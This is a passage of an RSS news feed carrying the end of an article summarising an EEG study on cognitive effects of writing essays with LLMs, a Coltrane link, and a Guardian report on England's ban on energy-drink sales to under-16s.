      &lt;item&gt;
        &lt;p&gt;EEG scans revealed a systematic scaling down of neural connectivity in the brain with increasing reliance on external tools:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Brain-only group: strongest, most widespread connectivity.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Search Engine group: intermediate.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;LLM group: weakest connectivity across alpha, beta, delta, and theta bands.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;LLM use resulted in under-engagement of critical attention and visual processing networks, especially in Session 4 when participants tried to write without AI.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;LLM Users Forget What They Just Wrote&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;In post-task interviews:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;83.3% of LLM users were unable to quote even one sentence from the essay they had just written.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;In contrast, 88.9% of Search and Brain-only users could quote accurately.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;0% of LLM users could produce a correct quote, while most Brain-only and Search users could.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;AI Use Disrupts Memory and Learning Pathways&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Participants previously using LLMs (then writing without it in Session 4) showed:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Weaker memory recall&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Lower alpha and beta neural engagement&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Signs of cognitive adaptation toward passivity and ‚Äúefficiency‚Äù at the cost of effortful learning.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;LLM Users Felt Detached From Their Work&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;When asked about authorship:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;LLM users gave responses like ‚Äú50/50‚Äù or ‚Äú70% mine.‚Äù&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Some claimed no ownership at all.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Brain-only group participants almost universally reported full ownership.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Switching from LLM to Brain Use Doesn‚Äôt Fully Restore Function&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Session 4: LLM-to-Brain participants showed lingering cognitive deficiency, failing to return to their original (Session 1) brain activity patterns.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Their neural activity remained below baseline, even after AI use was stopped.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Search Engine Users Showed Healthier Brain Engagement&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Search users maintained stronger executive function, memory activation, and quote recall.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;EEG data showed more robust occipital and parietal activation supporting visual processing and cognitive effort.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;AI Dependency Leads to ‚ÄúCognitive Offloading‚Äù&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Researchers noted a trend toward neural efficiency adaptation: the brain essentially ‚Äúlets go‚Äù of the effort required for synthesis and memory.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;This adaptation led to passivity, minimal editing, and low integration of concepts.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Short-Term Gains, Long-Term Cognitive Debt&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Despite receiving decent scores from judges, the LLM group‚Äôs writing:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Lacked strategic integration.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Used fewer diverse structures.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Was shorter and more robotic.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Over time, the group showed a consistent decline in engagement, performance, and self-reported satisfaction.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Based on this study, as more of the global population begins to rely on artificial intelligence to complete complex tasks, our cognitive abilities and creative capacities appear poised to take a nosedive into oblivion.&lt;/p&gt;
    &lt;p&gt;One thing is clear: if you currently use AI, take regular breaks‚Äîand give your own mind the chance to do the work. Otherwise, you may face severe cognitive harm and dependence.&lt;/p&gt;
    &lt;p&gt;The machines aren‚Äôt just taking over our work‚Äîthey‚Äôre taking over our minds.&lt;/p&gt;
    &lt;p&gt;Epidemiologist and Foundation Administrator, McCullough Foundation&lt;/p&gt;
    &lt;p&gt;Please consider following both the McCullough Foundation and my personal account on X (formerly Twitter) for further content.&lt;/p&gt;
    &lt;p&gt;IPAK-EDU is grateful to FOCAL POINTS (Courageous Discourse) as this piece was originally published there and is included in this news feed with mutual agreement. Read More&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45114753</guid></item><item><title>John Coltrane's Tone Circle</title><link>https://roelsworld.eu/blog-saxophone/coltrane-tone-circle/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45115004</guid></item><item><title>No place in children's hands: &lt;16s in UK to be banned from buying energy drinks</title><link>https://www.theguardian.com/business/2025/sep/02/children-energy-drinks-government-obesity-health</link><description>&lt;doc fingerprint="2f2d916e62385f5a"&gt;
  &lt;main&gt;
    &lt;p&gt;Under-16s in England will be banned from buying energy drinks such as Red Bull and Monster because they fuel obesity, cause sleep problems and leave them unable to concentrate.&lt;/p&gt;
    &lt;p&gt;Health experts, teaching unions and dentists welcomed the ban and said it would boost children and young people‚Äôs health. It fulfils a pledge Labour included in its manifesto for last year‚Äôs general election.&lt;/p&gt;
    &lt;p&gt;‚ÄúHow can we expect children to do well at school if they have the equivalent of a double espresso in their system on a daily basis?‚Äù, said Wes Streeting, the health secretary.&lt;/p&gt;
    &lt;p&gt;‚ÄúEnergy drinks might seem harmless but the sleep, concentration and wellbeing of today‚Äôs kids are all being impacted, while high sugar versions damage their teeth and contribute to obesity.‚Äù&lt;/p&gt;
    &lt;p&gt;Shops, cafes, restaurants and websites will be prohibited from selling energy drinks containing more than 150mg of caffeine per litre to anyone under 16. That will affect drinks such as Red Bull, Monster, Relentless and Prime Energy and force their makers to reformulate their products.&lt;/p&gt;
    &lt;p&gt;For example, a 250ml can of Red Bull contains 80mg of caffeine, the same as one espresso or two cans of cola. Tea, coffee and soft drinks containing lower amounts of caffeine will be unaffected.&lt;/p&gt;
    &lt;p&gt;It is unclear when sales to under-16s ‚Äì including from vending machines ‚Äì will become illegal. The ban will be done using secondary legislation under the Food Safety Act 1990.&lt;/p&gt;
    &lt;p&gt;Supermarkets voluntarily stopped selling the drinks to under-16s in 2018. But some smaller convenience stores still allow under-16s to buy them. Drinks containing more than 150mg of caffeine per litre already carry warning labels that they are ‚Äúnot suitable for children‚Äù.&lt;/p&gt;
    &lt;p&gt;‚ÄúHigh-caffeine energy drinks have no place in children‚Äôs hands. This is a common sense, evidence-based step to protect children‚Äôs physical, mental and dental health‚Äù, said Katharine Jenner, the director of the Obesity Health Alliance.&lt;/p&gt;
    &lt;p&gt;The success of preventing young people buying alcohol and cigarettes showed that age-based restrictions work, Jenner added. ‚ÄúAge-of-sale policies like this have a proven record of reducing access to products that are not suitable for children.‚Äù&lt;/p&gt;
    &lt;p&gt;Teachers have voiced concern about how energy drinks have left young children ‚Äúbouncing off the walls in lesson time‚Äù after consuming them on their way to school.&lt;/p&gt;
    &lt;p&gt;Bridget Phillipson, the education secretary, said the move would help tackle the ‚Äúscourge of poor classroom behaviour‚Äù, which is caused in part by ‚Äúthe harmful effects of caffeine-loaded drinks‚Äù.&lt;/p&gt;
    &lt;p&gt;Research by the NASUWT union found 71% of teachers worry about pupils misusing energy drinks at school and 70% while elsewhere.&lt;/p&gt;
    &lt;p&gt;‚ÄúThe drinks create a situation in which pupils can‚Äôt focus, can‚Äôt sit still and just think it‚Äôs cool to drink them‚Äù, one teacher said. Another said: ‚ÄúEnergy drinks make it very difficult for students to focus and engage with learning and seem to make students noisier and agitated.‚Äù&lt;/p&gt;
    &lt;p&gt;Matt Wrack, the union‚Äôs general secretary, said under-16s will still be able to get the drinks from parents or other adults, despite the ban.&lt;/p&gt;
    &lt;p&gt;Dentists urged the government to go further. The ban should be extended to include zero and low-sugar energy drinks to help tackle tooth decay, the British Dental Association said.&lt;/p&gt;
    &lt;p&gt;‚ÄúProducts that are habit-forming, highly acidic and can contain over 20 teaspoons of sugar have no place on the menu for children‚Äù, said Eddie Crouch, the association‚Äôs chair.&lt;/p&gt;
    &lt;p&gt;Dr Kawther Hashem, a lecturer in public health nutrition and head of research and impact at Action on Sugar, said trading standards officers would have to enforce the ban to ensure it worked.&lt;/p&gt;
    &lt;p&gt;Gavin Partington, the director general of the British Soft Drinks Association, said firms do not market or promote the drinks to under-16s.&lt;/p&gt;
    &lt;p&gt;He added: ‚ÄúOur members have led the way in self-regulation through our longstanding energy drinks code of practice.&lt;/p&gt;
    &lt;p&gt;‚ÄúOur members do not market or promote the sale of energy drinks to under-16s and label all high-caffeine beverages as ‚Äònot recommended for children‚Äô, in line with and in the spirit of this code.&lt;/p&gt;
    &lt;p&gt;‚ÄúAs with all government policy, it‚Äôs essential that any forthcoming regulation is based on a rigorous assessment of the evidence that‚Äôs available.‚Äù&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45115549</guid></item></channel></rss>